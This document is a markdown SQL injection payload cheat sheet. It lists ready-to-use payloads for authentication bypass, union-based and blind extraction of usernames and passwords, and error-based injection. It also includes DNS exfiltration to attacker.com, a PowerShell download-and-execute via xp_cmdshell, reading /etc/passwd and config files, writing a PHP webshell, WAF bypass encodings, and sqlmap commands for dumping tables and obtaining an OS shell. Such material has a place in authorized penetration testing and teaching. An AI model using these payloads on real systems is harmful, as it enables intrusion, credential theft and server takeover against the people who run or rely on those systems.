# SQL Injection Payloads

> Always confirm injection manually with a simple test before using sqlmap or aggressive payloads.
> Simple test first: add `'` — if it causes an error or behavioral change, injection likely exists.
> Use `--level 1 --risk 1` with sqlmap on production systems.

---

## Detection — Is It Injectable?

### Basic Error Triggering
```sql
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR "1"="1
1' AND '1'='1
1 AND 1=1
1 AND 1=2
```

### Boolean-Based Detection (No Error, Just Different Responses)
```sql
' AND 1=1--        ← true condition (normal response)
' AND 1=2--        ← false condition (different response)
1 AND 1=1
1 AND 1=2
' AND 'x'='x
' AND 'x'='y
```

### Time-Based Detection (Blind, No Visible Difference)
```sql
-- MySQL
' AND SLEEP(5)--
1; WAITFOR DELAY '0:0:5'--   ← MSSQL
' AND pg_sleep(5)--           ← PostgreSQL
' AND 1=1 AND SLEEP(5)--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

---

## Authentication Bypass

### Classic Bypass
```sql
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
" OR 1=1--
admin'--
admin' #
' OR 1=1#
') OR ('1'='1
')) OR (('1'='1
' OR 'x'='x
anything' OR 'x'='x
```

### Username Field Injection
```sql
admin'--                     ← Comment out password check
admin'/*                     ← Alternative comment
' OR 1=1--
' OR 1=1#
' OR 1=1/*
```

---

## Union-Based Injection

### Step 1: Find Number of Columns
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--        ← Keep incrementing until error
' GROUP BY 1,2,3--

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   ← Keep adding until no error
```

### Step 2: Find Printable Columns
```sql
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### Step 3: Extract Data

#### MySQL
```sql
-- Database version
' UNION SELECT NULL,@@version,NULL--

-- Current database
' UNION SELECT NULL,database(),NULL--

-- All databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- Tables in current DB
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- Columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT NULL,username,password FROM users--

-- Concatenate multiple columns
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--
```

#### MSSQL
```sql
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,db_name(),NULL--
' UNION SELECT NULL,name,NULL FROM master.dbo.sysdatabases--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### PostgreSQL
```sql
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,current_database(),NULL--
' UNION SELECT NULL,datname,NULL FROM pg_database--
' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Oracle
```sql
' UNION SELECT NULL,banner,NULL FROM v$version--
' UNION SELECT NULL,owner,NULL FROM all_tables--
' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE owner='TARGET'--
```

---

## Blind SQLi

### Boolean-Based
```sql
-- MySQL: Does admin user exist?
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--

-- Extract data character by character
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p'--
' AND ASCII(SUBSTRING(password,1,1))>100--     ← Binary search approach

-- Does table 'users' exist?
' AND (SELECT COUNT(*) FROM users)>0--
```

### Time-Based (No Response Difference)
```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
' AND IF(SUBSTRING(password,1,1)='p',SLEEP(5),0) FROM users WHERE username='admin'--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' AND pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99),5))--
```

---

## Out-of-Band (OOB) Exfiltration

When blind SQLi responses are too slow or unreliable.

### MySQL (DNS Exfil)
```sql
' AND LOAD_FILE(concat('\\\\',database(),'.attacker.com\\a'))--
' UNION SELECT LOAD_FILE(concat(0x5c5c5c5c,(SELECT password FROM users LIMIT 1),0x2e61747461636b65722e636f6d5c5c61))--
```

### MSSQL (xp_cmdshell + DNS)
```sql
'; exec master..xp_dirtree '\\attacker.com\share'--
'; exec master..xp_cmdshell 'nslookup attacker.com'--
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'--
```

### PostgreSQL (COPY TO)
```sql
'; COPY (SELECT password FROM users LIMIT 1) TO '/tmp/output.txt'--
'; CREATE TABLE t(c text); COPY t FROM '/etc/passwd'; SELECT * FROM t--
```

---

## Error-Based Injection

### MySQL
```sql
' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
```

### MSSQL
```sql
' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=convert(int,@@version)--
```

### PostgreSQL
```sql
' AND 1=cast(version() as int)--
' AND 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1) as int)--
```

---

## File Read/Write

### MySQL File Read
```sql
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL--
' UNION SELECT NULL,LOAD_FILE('C:\\Windows\\win.ini'),NULL--
```

### MySQL File Write (Webshell)
```sql
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
```

### MSSQL Read
```sql
'; EXEC xp_cmdshell 'type C:\Windows\win.ini'--
'; BULK INSERT tmptable FROM 'C:\Windows\win.ini' WITH (ROWTERMINATOR='\n')--
```

---

## Stacked Queries (Command Execution)

### MSSQL — Enable xp_cmdshell
```sql
'; EXEC sp_configure 'show advanced options',1--
'; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1--
'; RECONFIGURE--
'; EXEC xp_cmdshell 'whoami'--
```

### PostgreSQL — Command Execution
```sql
'; CREATE OR REPLACE FUNCTION system(text) RETURNS text AS 'select * from pg_read_file($1)' LANGUAGE SQL--
'; COPY cmd_exec FROM PROGRAM 'id'--
'; SELECT * FROM pg_read_file('/etc/passwd')--
```

---

## WAF Bypass Techniques

### Comments
```sql
' UN/**/ION SEL/**/ECT NULL--
' /*!UNION*/ /*!SELECT*/ NULL--
'/**/UNION/**/SELECT/**/NULL--
```

### Case Variation
```sql
' uNiOn SeLeCt NULL--
' UnIoN SeLeCt NULL--
```

### URL Encoding
```sql
%27%20OR%201%3D1--
%27%20UNION%20SELECT%20NULL--
```

### Double Encoding
```sql
%2527%2520UNION%2520SELECT%2520NULL--
```

### Whitespace Alternatives
```sql
' UNION%09SELECT%09NULL--      ← tab
' UNION%0ASELECT%0ANULL--      ← newline
' UNION%0DSELECT%0DNULL--      ← carriage return
```

### Keyword Alternatives
```sql
-- Instead of UNION SELECT:
UNION ALL SELECT
UNION DISTINCT SELECT

-- Instead of OR:
|| (MySQL, PostgreSQL)
OR 0x61=0x61

-- Instead of spaces:
/**/  %20  %09  %0A  +
```

---

## SQLmap Quick Reference

```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1" --batch

# POST request
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch

# With cookies (authenticated)
sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123" --batch

# Specific parameter
sqlmap -u "https://target.com/page?id=1&cat=2" -p id --batch

# Dump current database
sqlmap -u "https://target.com/page?id=1" --current-db --batch

# Dump tables
sqlmap -u "https://target.com/page?id=1" -D mydb --tables --batch

# Dump specific table
sqlmap -u "https://target.com/page?id=1" -D mydb -T users --dump --batch

# Try for OS shell (requires stacked queries + file write)
sqlmap -u "https://target.com/page?id=1" --os-shell --batch

# Use Burp request file
sqlmap -r request.txt --batch

# Higher aggression (use carefully on production)
sqlmap -u "https://target.com/page?id=1" --level=3 --risk=2 --batch
```
